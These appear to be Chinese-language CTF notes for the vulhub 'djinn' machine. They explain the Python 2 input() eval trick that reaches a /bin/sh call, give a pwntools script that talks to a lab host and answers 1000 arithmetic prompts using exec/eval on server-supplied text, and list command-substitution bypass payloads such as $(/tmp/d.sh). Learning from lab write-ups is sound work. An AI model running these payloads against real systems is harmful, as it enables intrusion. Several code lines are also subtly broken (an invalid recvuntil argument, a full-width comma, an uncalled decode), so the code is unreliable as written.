**虚拟环境安装**
```bash
python -m venv .venv
cd .venv ; source bin/activate
cd .. ; pip install .
```
### python2 特性

```python
def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'
```

可以直接输入：num
![](photos/Pasted%20image%2020231227111451.png)


### PWN

- 案例
> **[0x15 djinn WP](../../0X03%20vulhub%20WP/第三组推荐靶机%20obsibian/0x15%20djinn%20WP.md)**

![](photos/Pasted%20image%2020231226183953.png)

- 要连续答对1000题，会给 GIFT 。
- 先输出到 gift.  ；然后下面是一个数组(7,'+',8) , 输出到> 
- 获取数组中各个的值进行运算
- 输入运算后的数据
- 打印下一次信息


- **import**
```python
from pwn import *
```

```python
conn = remote('192.168.55.139', 1337)
#用于创建一个与远程服务器的连接
resp = conn.recvuntil(b'gift.\n')
#从远程连接接收数据,直到遇到指定的字符串为止
#b表示字节字符串
print(resp.decode(), end='')
```

![](photos/Pasted%20image%2020231226190104.png)

再看一下下一次的输出：
![](photos/Pasted%20image%2020231226190141.png)

**所以我们这次只要到 > 就可以了：**
```python
resp = conn.recvuntil(b'> ', end='')
print(resp.decode(), end='')
```

![](photos/Pasted%20image%2020231226185710.png)

**接下来就是处理运算输入打印的操作：**

- **split()**
![](photos/Pasted%20image%2020231226192148.png)

- **exec() eval()**
![](photos/Pasted%20image%2020231226193552.png)

```python
data = resp.decode().split('\n')[0]
#处理输出的字符串 ， 截取前半段(x,'x',x)
exec(f'data = {data}')
#把处理过的数据转换成f-string ; {data}为占位符 , f:f-string缩写
result = eval(f'{data[0]} {data[1]} {data[2]}')
#使用eval和{data[]}占位符 进行运算
result = str(result)
print(result， end='')
conn.send(result.encode())
```

![](photos/Pasted%20image%2020231226195041.png)

把最后一次的运行交给我们，好让我们看见最后输出了什么 gift ，同时要记得断开连接

```python
conn.interactive()
#暂停执行脚本，把控制权交给用户
conn.close()
#关闭连接
```

最后就是循环1000次:

```python
from pwn import *

conn = remote('192.168.55.139', 1337)
resp = conn.recvuntil(b'gift.\n')
print(resp.decode(), end='')

for i in range(1000):
	
	resp = conn.recvuntil(b'> ')
	print(resp.decode, end='')
	
	data = resp.decode().split('\n')[0]
	exec(f'data = {data}')
	result = eval(f'{data[0]} {data[1]} {data[2]}')
	
	result = str(result) + '\n'
	print(result, end='')
	conn.send(result.encode())

conn.interactive()
conn.close()
```


**python 绕过**
$(xxx)
$(/tmp/d.sh)
$(echo 8)